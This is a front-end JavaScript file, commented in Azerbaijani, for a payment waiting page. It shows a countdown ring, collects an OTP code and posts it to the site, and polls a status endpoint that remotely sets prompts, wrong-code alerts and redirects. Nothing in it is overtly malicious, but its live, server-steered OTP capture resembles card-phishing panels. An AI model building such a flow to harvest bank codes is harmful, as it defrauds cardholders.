/* public/js/secure-flow.js — gözləmə ekranı, dairəvi geri sayım, OTP göndərişi */
(function () {
  'use strict';

  var box = document.getElementById('stageBox');
  if (!box) return;

  var statusUrl = box.getAttribute('data-status-url');
  var orderId = box.getAttribute('data-order-id');
  var stageSeconds = Number(box.getAttribute('data-stage-seconds')) || 120;
  var secondsLeft = Number(box.getAttribute('data-seconds-left')) || 0;
  var stage = box.getAttribute('data-stage') || 'card_review';

  var ring = box.querySelector('[data-ring]');
  var ringLabel = box.querySelector('[data-ring-label]');
  var titleEl = box.querySelector('[data-stage-title]');
  var noteEl = box.querySelector('[data-stage-note]');
  var alertEl = box.querySelector('[data-stage-alert]');
  var circumference = ring ? 2 * Math.PI * ring.r.baseVal.value : 0;

  if (ring) {
    ring.style.strokeDasharray = circumference;
    ring.style.strokeDashoffset = 0;
  }

  function fmt(s) {
    var m = Math.floor(s / 60);
    var r = s % 60;
    return m + ':' + (r < 10 ? '0' : '') + r;
  }

  function paint() {
    if (ringLabel) ringLabel.textContent = fmt(Math.max(0, secondsLeft));
    if (ring) {
      var pct = Math.max(0, Math.min(1, secondsLeft / stageSeconds));
      ring.style.strokeDashoffset = circumference * (1 - pct);
    }
  }
  paint();

  setInterval(function () {
    if (secondsLeft > 0) { secondsLeft -= 1; paint(); }
  }, 1000);

  /* ==================== OTP formu ==================== */
  var otpForm = document.getElementById('otpForm');
  if (otpForm) {
    var input = otpForm.querySelector('input[name="code"]');
    if (input) {
      input.addEventListener('input', function () {
        input.value = input.value.replace(/\D/g, '').slice(0, 8);
      });
      input.focus();
    }

    otpForm.addEventListener('submit', async function (ev) {
      ev.preventDefault();
      var code = (input.value || '').replace(/\D/g, '');
      var noteBox = document.getElementById('otpNote');

      function say(msg, kind) {
        if (!noteBox) return;
        noteBox.className = 'alert alert--' + kind;
        noteBox.textContent = msg;
        noteBox.classList.remove('hidden');
      }

      if (!code) return say('OTP kodunu daxil edin', 'error');

      var btn = otpForm.querySelector('button[type="submit"]');
      btn.disabled = true;
      btn.textContent = 'Göndərilir…';
      say('OTP kodu bankın təsdiqinə göndərilir…', 'info');

      var res = await fetch('/api/payment/verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest' },
        credentials: 'same-origin',
        body: JSON.stringify({ orderId: orderId, code: code })
      });
      var data = {};
      try { data = await res.json(); } catch (e) { data = { ok: false, message: 'Server cavabı oxunmadı' }; }

      if (data.ok) { window.location.href = data.redirect; return; }
      btn.disabled = false;
      btn.textContent = 'Ödənişi təsdiqlə';
      say(data.message || 'OTP göndərilə bilmədi', 'error');
    });
  }

  /* ==================== Canlı vəziyyət sorğusu ==================== */
  var currentPath = window.location.pathname;

  async function poll() {
    try {
      var res = await fetch(statusUrl, {
        headers: { 'X-Requested-With': 'XMLHttpRequest' },
        credentials: 'same-origin'
      });
      var d = await res.json();
      if (!d.ok) return;

      if (d.stage !== stage) {
        stage = d.stage;
        stageSeconds = d.stageSeconds || stageSeconds;
      }
      secondsLeft = d.secondsLeft;
      paint();

      if (titleEl && d.title) titleEl.textContent = d.title;
      if (noteEl && d.note) noteEl.textContent = d.note;
      if (alertEl) alertEl.style.display = d.wrongCode ? '' : 'none';

      if (d.redirect && d.redirect !== currentPath) {
        window.location.href = d.redirect;
      }
    } catch (e) { /* şəbəkə kəsilməsində növbəti sorğuda davam edir */ }
  }

  setInterval(poll, 2000);
  poll();
})();
